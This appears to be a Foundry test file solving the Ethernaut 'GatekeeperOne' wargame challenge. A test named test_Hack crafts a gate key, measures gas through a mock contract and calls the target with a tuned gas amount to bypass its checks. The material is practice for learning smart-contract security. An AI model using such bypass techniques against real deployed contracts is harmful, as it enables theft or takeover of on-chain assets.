// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {GatekeeperOne} from "../src/gatekeeperone/GatekeeperOne.sol";
import {GatekeeperOneMock} from "../src/gatekeeperone/GatekeeperOneMock.sol";
import {GatekeeperOneHelper} from "../src/gatekeeperone/GatekeeperOneHelper.sol";
import {Test, console2} from "forge-std/Test.sol";
import "../src/account.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne public sc;
    GatekeeperOneMock public scMock;
    GatekeeperOneHelper public scHelper;

    function setUp() public {
        sc = new GatekeeperOne();
        scMock = new GatekeeperOneMock();
        scHelper = new GatekeeperOneHelper(address(sc), address(scMock));
    }

    // todo question: call the same function with different gas suppled, the gas cost is different
    function test_Hack() public {
        vm.startBroadcast(account.ACC_PRIVATE_KEY_0);

        address acc = account.ACC_0;
        //bytes8 key = bytes8(uint64(uint160(acc)));
        bytes8 key = 0x1000000000005c89;
        //key = key & 0xfffff0000000ffff;
        console2.logBytes8(key);
        //localCheck(key);

        // call gas
        uint256 gasBefore = 90100;
        scHelper.kickMock{gas: 90100}(key);
        uint256 gasAfter = scMock.gasLeftBeforeGateTwo();
        uint256 cost = gasBefore - gasAfter;
        console2.log(cost);
        assertEq(scHelper.kick{gas: 81910+6652}(key), true);
    }
}
